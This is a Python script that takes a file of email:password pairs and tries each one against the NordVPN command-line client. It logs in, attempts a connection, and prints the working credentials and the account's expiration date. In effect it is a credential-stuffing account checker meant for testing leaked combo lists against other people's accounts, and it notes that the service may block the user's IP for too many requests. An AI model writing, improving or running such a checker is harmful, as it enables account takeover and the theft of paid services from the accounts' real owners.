import os
import subprocess
import sys
import argparse
import time
from typing import Union


# console colors
G = '\033[92m'  # Green
W = '\033[93m'  # Warning (yellow)
R = '\033[91m'  # Red
E = '\033[0m'   # Erase (the default color)
B = '\033[34m'  # Blue




def read_arguments():

    parser = argparse.ArgumentParser(
        description='Check NordVPN login and Connection'
    )

    parser.add_argument(
        '-f',
        '--file',
        help='The file that contains your email:password entries',
        action='store',
        required=True,
        metavar='FILE'
    )

    return parser.parse_args()
def try_connection() -> Union['False', None, str]:
    connection_result = subprocess.run(
    ['nordvpn', 'c', 'canada'],
    capture_output = True,
    text = True
    )
    if not connection_result.returncode == 0:
    #failed to connect
        return False
    else:
        connection_info = subprocess.run(
            ['nordvpn', 'status'],
            capture_output=True,
            text=True
        )
        if 'Disconnected' in connection_info.stdout:
            return None
        else:
            return connection_info.stdout

def check_login(email: str, password: str) -> Union['False', None, str]:
    # make sure you're logged out of NordVPN
    subprocess.run(['nordvpn', 'logout'], capture_output=True)

    login_result = subprocess.run(
        ['nordvpn', 'login', '-u', email, '-p', password],
        capture_output=True,
        text=True
    )
    if not login_result.returncode == 0:
        # Failed to login
        return False
    else:
        # Ensure the user is logged in
        account_info = subprocess.run(
            ['nordvpn', 'account'],
            capture_output=True,
            text=True
        )
        if 'You are not logged in.' in account_info.stdout:
            return None
        else:
            return account_info.stdout


def parse_expiration_date(login_result: str) -> str:
    return login_result.split('VPN Service: ')[
        1].rstrip()


def read_file(args) -> None:
    input_file_path = args.file
    if not os.path.isfile(input_file_path):
        print('The path specified does not exist', input_file_path)
        sys.exit()

    # check if the specified file is empty
    if os.stat(input_file_path).st_size == 0:
        print('The file specified is empty.')
        sys.exit()

    with open(input_file_path) as f:
        count = 0
        for line in f:
            if not line.strip():  # ignore empty lines in file
                continue

            count += 1

            email, password = line.strip().split(':')
            print(B + f'{count}) Checking ➜', W +
                  f'{email}:{password}\r' + E, end='')

            login_result = check_login(email, password)
            connection_result = try_connection()

            if not login_result:
                # Failed to login
                print(
                    B + f'{count}) Checking ➜',
                    W + f'{email}:{password}',
                    '\t\t\t',
                    R + 'Failed to Login' + E
                )
            elif login_result is None:
                # No response from NordVPN
                print(
                    B + f'{count}) Checking ➜',
                    W + f'{email}:{password}',
                    '\t\t\t',
                    R + 'No response' + E
                )
                print(
                    R+"NordVPN might be temporarily blocking your IP due to too many requests."+E)
            elif not connection_result:
        #failed to connect
                print(
                    B + f'{count}) Checking ➜',
                    W + f'{email}:{password}',
                    '\t\t\t',
                    R + 'Failed to Connect' + E
                )
            elif connection_result is None:
            #No Connection Result
                print(
                        B + f'{count}) Checking ➜',
                        W + f'{email}:{password}',
                        '\t\t\t',
                        R + 'No response Connection' + E
                    )
                print(R+"NordVPN might be temporarily blocking your IP due to too many requests."+E)
            else:
                account_expiration_date = parse_expiration_date(login_result)
                print(
                    B + f'{count}) Checking ➜',
                    W + f'{email}:{password}\t\t',
                    G + account_expiration_date ,
                    B + 'Connection Success!\n\n' + E
                )
                print("█▀▀ █▀█ █▄░█ █▄░█ █▀▀ █▀▀ ▀█▀ █ █▀█ █▄░█   █▀ █░█ █▀▀ █▀▀ █▀▀ █▀ █▀\n" +
                      "█▄▄ █▄█ █░▀█ █░▀█ ██▄ █▄▄ ░█░ █ █▄█ █░▀█   ▄█ █▄█ █▄▄ █▄▄ ██▄ ▄█ ▄█")
                print('------------------------------------------------------------------------------')
                print(email+" "+password)
                print('------------------------------------------------------------------------------')
                exit()

if __name__ == "__main__":
    args = read_arguments()

    # Initialize the script
    try:
        read_file(args)
    except KeyboardInterrupt:
        print(R+"\nQuitting..."+E)
